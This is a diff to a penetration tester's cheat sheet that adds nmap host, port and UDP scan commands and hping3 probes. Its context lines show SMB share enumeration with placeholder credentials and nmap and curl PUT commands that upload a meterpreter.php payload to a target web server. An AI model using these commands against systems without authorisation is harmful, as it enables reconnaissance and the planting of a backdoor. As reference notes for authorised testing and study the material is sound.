@@ -14,6 +14,37 @@ DST/MASK      DEV  GATEWAY
 
 NMAP
 ======
+
+[+] NMAP Scans
+
+[+] Nmap ping scan
+sudo nmap –sn -oA nmap_pingscan 192.168.100.0/24 (-PE)
+
+[+] Nmap SYN/Top 100 ports Scan
+nmap -sS -F -oA nmap_fastscan 192.168.0.1/24
+
+[+] Nmap SYN/Version All port Scan - ## Main Scan
+sudo nmap -sV -PN -p0- -T4 -A --stats-every 60s --reason -oA nmap_scan 192.168.0.1/24
+
+[+] Nmap SYN/Version No Ping All port Scan
+sudo nmap -sV -Pn -p0- --exclude 192.168.0.1 --reason -oA nmap_scan 192.168.0.1/24
+
+[+] Nmap UDP All port scan - ## Main Scan
+sudo nmap -sU -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_scan 192.168.0.1/24
+
+[+] Nmap UDP/Fast Scan
+nmap -F -sU -oA nmap_UDPscan 192.168.0.1/24
+
+[+] Nmap Top 1000 port UDP Scan
+nmap -sU -oA nmap_UDPscan 192.168.0.1/24
+
+[+] HPING3 Scans
+hping3 -c 3 -s 53 -p 80 -S 192.168.0.1
+Open = flags = SA
+Closed = Flags = RA
+Blocked = ICMP unreachable
+Dropped = No response
+
 nmap -sU -pT:21,22,23,U:53,137 X.X.X.0/24
 
 nmap -PS445 -p445 --script=smb-enum-shares,smb-ls --script-args=ls.maxdepth=10,smbdomain=<DOMAIN>,smbuser=<USER>,smbpass='<PASSWORD>',smb-ls.share=PubShare <FQDN>
@@ -50,10 +81,10 @@ NMAP PUT
 =======
 nmap -sV --script http-put --scrip-args http-put.url='/uploads/meterpreter.php’,http-put.file='/root/Desktop/meterpreter.php' -p 8585 [Target IP]
 
+
 CURL PUT
 =======
 curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://172.28.128.3:8585/uploads/meterpreter.php
-
 
 
 tnscmd10g version -h X.X.X.X
